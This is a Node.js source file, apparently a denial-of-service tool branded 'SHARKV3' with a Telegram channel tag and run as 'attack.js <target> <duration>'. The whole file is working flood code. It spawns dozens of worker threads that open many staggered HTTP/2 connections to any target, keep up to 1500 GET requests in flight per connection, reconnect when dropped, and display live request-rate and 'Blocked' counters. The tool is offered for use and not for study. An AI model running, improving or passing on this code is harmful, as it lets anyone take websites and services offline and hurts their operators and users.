const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');

const THREADS = 16;
const CONNECTIONS_PER_THREAD = 25;
const POWER_MULTIPLIER = 2;
const WARMUP_TIME = 5000;
const MAX_INFLIGHT = 1500;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`Warming up... Starting attack in 5s`);

    setTimeout(() => {
        console.clear();
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);

        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration, initial: true } });
        }

        setTimeout(() => {
            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
                new Worker(__filename, { workerData: { target, duration, initial: false } });
            }
        }, WARMUP_TIME);

        setInterval(() => {
            maxRps = Math.max(maxRps, rpsLastSecond);
            renderStats();
            rpsLastSecond = 0;
        }, 1000);
    }, WARMUP_TIME);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') {
                totalRequests++;
                rpsLastSecond++;
            } else if (msg === 'ok') {
                successCount++;
            } else if (msg === 'err') {
                errorCount++;
            }
        });
    });
    server.listen(9999);
} else {
    const { target, duration, initial } = workerData;
    const totalConnections = (initial ? CONNECTIONS_PER_THREAD : CONNECTIONS_PER_THREAD * POWER_MULTIPLIER);
    const end = Date.now() + duration * 1000;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendRequest(client, inflight) {
        if (Date.now() > end) return;
        if (inflight.count >= MAX_INFLIGHT) return setTimeout(() => sendRequest(client, inflight), 1);

        try {
            inflight.count++;
            const req = client.request({ ':path': '/', ':method': 'GET' });
            req.setNoDelay?.(true);
            req.on('response', headers => {
                if (headers[':status'] >= 200 && headers[':status'] < 300) {
                    sendStat('ok');
                } else {
                    sendStat('err');
                }
                inflight.count--;
            });
            req.on('error', () => {
                sendStat('err');
                inflight.count--;
            });
            req.end();
            sendStat('req');
        } catch {
            inflight.count--;
            sendStat('err');
        }

        setImmediate(() => sendRequest(client, inflight));
    }

    function createConnectionStaggered(index) {
        setTimeout(() => {
            try {
                const client = http2.connect(target);
                const inflight = { count: 0 };
                client.on('error', () => {});
                client.on('close', () => setTimeout(() => createConnectionStaggered(index), 250));
                client.on('connect', () => {
                    for (let i = 0; i < 25; i++) sendRequest(client, inflight);
                });
            } catch {
                setTimeout(() => createConnectionStaggered(index), 500);
            }
        }, index * 40); // 40ms spacing
    }

    for (let i = 0; i < totalConnections; i++) {
        createConnectionStaggered(i);
    }
}
